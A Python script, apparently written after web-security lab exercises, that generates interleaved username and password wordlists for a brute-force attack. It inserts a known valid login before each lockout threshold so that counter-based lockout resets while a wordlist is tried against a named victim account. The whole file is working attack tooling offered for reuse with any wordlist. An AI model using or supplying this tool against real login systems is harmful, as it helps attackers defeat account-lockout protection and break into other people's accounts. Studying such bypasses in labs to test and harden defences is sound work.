#!/usr/bin/env python3
# Lassey

# While working some labs on bypassing bruteforce protections, I came across a scenario where the web app used 
# counter-based restrictions. To bypass this, I needed to insert the valid creds at intervals before the lockout

# Therefore I thought.. automating this is necessary and I get to use this anytime with any wordlist of my choice

"""
interleave_wordlist_generator.py
Pitchfork-synchronized credential injector for counter-reset lockout bypass.
"""

import sys
from pathlib import Path


def prompt(label: str, secret: bool = False) -> str:
    import getpass
    value = (getpass.getpass(f"  {label}: ") if secret else input(f"  {label}: ")).strip()
    if not value:
        print(f"[!] {label} cannot be empty.", file=sys.stderr)
        sys.exit(1)
    return value


def build_interleaved(
    passwords: list[str],
    victim_user: str,
    reset_user: str,
    reset_pass: str,
    threshold: int,
) -> tuple[list[str], list[str]]:
    usernames: list[str] = []
    out_passwords: list[str] = []
    attempt_counter = 0

    for candidate in passwords:
        if attempt_counter == threshold - 1:
            usernames.append(reset_user)
            out_passwords.append(reset_pass)
            attempt_counter = 0

        usernames.append(victim_user)
        out_passwords.append(candidate)
        attempt_counter += 1

    return usernames, out_passwords


def main() -> None:
    if len(sys.argv) < 2:
        print("[!] Usage: python3 interleave_wordlist_generatorr.py <passwords.txt>", file=sys.stderr)
        sys.exit(1)

    wordlist_path = Path(sys.argv[1])
    if not wordlist_path.is_file():
        print(f"[!] File not found: {wordlist_path}", file=sys.stderr)
        sys.exit(1)

    raw_passwords = [
        line.rstrip("\n")
        for line in wordlist_path.read_text(encoding="utf-8", errors="replace").splitlines()
        if line.strip()
    ]

    if not raw_passwords:
        print("[!] Password wordlist is empty.", file=sys.stderr)
        sys.exit(1)

    print(f"\n[+] {len(raw_passwords):,} candidates loaded\n")

    victim_user = prompt("Victim username")
    reset_user  = prompt("Reset username")
    reset_pass  = prompt("Reset password", secret=True)

    while True:
        try:
            threshold = int(prompt("Lockout threshold"))
            if threshold < 2:
                print("[!] Threshold must be >= 2.")
                continue
            break
        except ValueError:
            print("[!] Enter a whole number.")

    usernames, passwords = build_interleaved(
        raw_passwords, victim_user, reset_user, reset_pass, threshold
    )

    assert len(usernames) == len(passwords), "BUG: list length mismatch"

    out_users = Path("interleaved_users.txt")
    out_pwds  = Path("interleaved_passwords.txt")

    out_users.write_text("\n".join(usernames) + "\n", encoding="utf-8")
    out_pwds.write_text("\n".join(passwords) + "\n", encoding="utf-8")

    reset_count = len(usernames) - len(raw_passwords)
    inject_rows = [i + 1 for i, u in enumerate(usernames) if u == reset_user]

    print(f"\n[+] interleaved_users.txt     — {len(usernames):,} lines")
    print(f"[+] interleaved_passwords.txt — {len(passwords):,} lines")
    print(f"[+] Resets injected : {reset_count:,}")
    print(f"[+] Inject at rows  : {inject_rows[:10]}{' ...' if len(inject_rows) > 10 else ''}\n")


if __name__ == "__main__":
    main()
